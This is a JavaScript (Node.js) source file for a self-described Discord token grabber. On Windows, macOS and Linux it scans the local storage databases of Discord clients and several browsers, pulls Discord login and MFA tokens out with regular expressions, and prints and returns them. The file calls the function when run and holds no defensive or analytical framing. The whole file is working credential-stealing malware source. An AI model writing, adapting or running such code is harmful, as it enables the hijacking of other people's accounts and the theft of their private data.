const fs = require('fs');
const path = require('path');

const findToken = (tokenPath) => {
    const computerPlatform = process.platform;

    const windows = 'win32';
    const macOS = 'darwin';
    const linux = 'linux';

    let tokens = [];

    if (computerPlatform == windows) {
        tokenPath += '\\Local Storage\\leveldb';

        try {
            fs.readdirSync(path.normalize(tokenPath)).map((file) => {
                if (file.endsWith('.log') || file.endsWith('.ldb')) {
                    fs.readFileSync(`${tokenPath}\\${file}`, 'utf8')
                        .split(/\r?\n/)
                        .forEach((line) => {
                            const regex = [
                                new RegExp(/mfa\.[\w-]{84}/g),
                                new RegExp(/[\w-]{24}\.[\w-]{6}\.[\w-]{27}/g)
                            ];
                            for (const _regex of regex) {
                                const token = line.match(_regex);

                                if (token) {
                                    token.forEach((element) => {
                                        if (!tokens.includes(element)) {
                                            tokens.push(element);
                                        }
                                    });
                                }
                            }
                        });
                }
            });
        } catch (error) {
            console.log(`=> No directory found for ${tokenPath}`);
        }
    } else if (computerPlatform == macOS) {
        tokenPath += '/Local Storage/leveldb/';

        try {
            fs.readdirSync(path.normalize(tokenPath)).map((file) => {
                if (file.endsWith('.log') || file.endsWith('.ldb')) {
                    fs.readFileSync(`${tokenPath}/${file}`, 'utf8')
                        .split(/\r?\n/)
                        .forEach((line) => {
                            const regex = [
                                new RegExp(/mfa\.[\w-]{84}/g),
                                new RegExp(/[\w-]{24}\.[\w-]{6}\.[\w-]{27}/g)
                            ];
                            for (const _regex of regex) {
                                const token = line.match(_regex);

                                if (token) {
                                    token.forEach((element) => {
                                        tokens.push(element);
                                    });
                                }
                            }
                        });
                }
            });
        } catch (error) {
            console.log(`=> No directory found for ${tokenPath}`);
        }
    } else if (computerPlatform === linux) {
        tokenPath += '/Local Storage/leveldb/';

        try {
            fs.readdirSync(path.normalize(tokenPath)).map((file) => {
                if (file.endsWith('.log') || file.endsWith('.ldb')) {
                    fs.readFileSync(`${tokenPath}/${file}`, 'utf8')
                        .split(/\r?\n/)
                        .forEach((line) => {
                            const regex = [
                                new RegExp(/mfa\.[\w-]{84}/g),
                                new RegExp(/[\w-]{24}\.[\w-]{6}\.[\w-]{27}/g)
                            ];
                            for (const _regex of regex) {
                                const token = line.match(_regex);

                                if (token) {
                                    token.forEach((element) => {
                                        if (!tokens.includes(element)) {
                                            tokens.push(element);
                                        }
                                    });
                                }
                            }
                        });
                }
            });
        } catch (error) {
            if (error) {
                console.log(`=> No directory found for ${tokenPath}`);
            }
        }
    }
    return tokens;
};

function discordTokenGrabber() {
    let paths;
    const computerPlatform = process.platform;

    if (computerPlatform == 'win32') {
        const local = process.env.LOCALAPPDATA;
        const roaming = process.env.APPDATA;

        paths = {
            Discord: path.join(roaming, 'Discord'),
            'Discord Canary': path.join(roaming, 'discordcanary'),
            'Discord PTB': path.join(roaming, 'discordptb'),
            'Google Chrome': path.join(
                local,
                'Google',
                'Chrome',
                'User Data',
                'Default'
            ),
            Opera: path.join(roaming, 'Opera Software', 'Opera Stable'),
            Brave: path.join(
                local,
                'BraveSoftware',
                'Brave-Browser',
                'User Data',
                'Default'
            ),
            Yandex: path.join(
                local,
                'Yandex',
                'YandexBrowser',
                'User Data',
                'Default'
            )
        };
    } else if (computerPlatform == 'linux') {
        const home = path.join(process.env.HOME, '.config/');

        paths = {
            'Discord': path.join(home, 'discord'),
            'Discord Canary': path.join(home + 'discordcanary' + '/Default'),
            'Discord PTB': path.join(home + 'discordptb' + '/Default'),
            'Google Chrome': path.join(home + 'google-chrome' + '/Default'),
            'Chromium': path.join(home + 'chromium' + '/Default')
        };
    } else if (computerPlatform == 'darwin') {
        paths = {
            Discord: path.join(
                process.env.HOME,
                'Library',
                'Application Support',
                'discord'
            ),
            'Discord Canary': path.join(
                process.env.HOME,
                'Library',
                'Application Support',
                'discordcanary'
            ),
            'Discord PTB': path.join(
                process.env.HOME,
                'Library',
                'Application Support',
                'discordptb'
            ),
            'Google Chrome': path.join(
                process.env.HOME,
                'Library',
                'Application Support',
                'Google',
                'Chrome'
            ),
            Opera: path.join(
                process.env.HOME,
                'Library',
                'Application Support',
                'com.operasoftware.Opera'
            ),
            Brave: path.join(
                process.env.HOME,
                'Library',
                'Application Support',
                'BraveSoftware',
                'Brave-Browser'
            ),
            Yandex: path.join(
                process.env.HOME,
                'Library',
                'Application Support',
                'Yandex',
                'YandexBrowser'
            )
        };
    } else {
        return console.log(
            'The Discord Token Grabber support only Windows, Linux and MacOS.'
        );
    }

    const tokens = {};
    for (let [platform, path] of Object.entries(paths)) {
        const tokenList = findToken(path);
        if (tokenList) {
            tokenList.forEach((token) => {
                if (tokens[platform] === undefined) tokens[platform] = [];
                tokens[platform].push(token);
            });
        }
    }
    console.log(tokens);
    return tokens;
}

discordTokenGrabber();